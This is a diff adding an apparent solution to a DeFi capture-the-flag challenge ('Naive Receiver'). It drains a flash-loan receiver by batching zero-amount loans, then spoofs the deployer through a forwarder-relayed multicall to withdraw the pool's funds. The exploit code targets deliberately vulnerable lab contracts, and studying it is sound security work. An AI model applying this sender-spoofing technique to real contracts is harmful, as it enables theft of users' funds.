@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
@@ -77,7 +78,27 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory data = new bytes[](11);
+        for (uint i = 0; i < 10; i++) {
+            // memory:[4 bytes selector][32 bytes receiver][32 bytes token][32 bytes amount][bytes data]
+            data[i] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 0, ""));
+        }
+        // memory:[4 bytes selector][32 bytes amount][32 bytes receiver][32 bytes deployer]
+        data[10] = abi.encodeWithSignature("withdraw(uint256,address)", 1010e18, payable(recovery), deployer);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: 0,
+            data: abi.encodeWithSignature("multicall(bytes[])", data),
+            deadline: block.timestamp
+        });
+
+        bytes32 digest = keccak256(abi.encodePacked(bytes2(0x1901), forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        forwarder.execute(request, abi.encodePacked(r, s, v));
     }
 
     /**
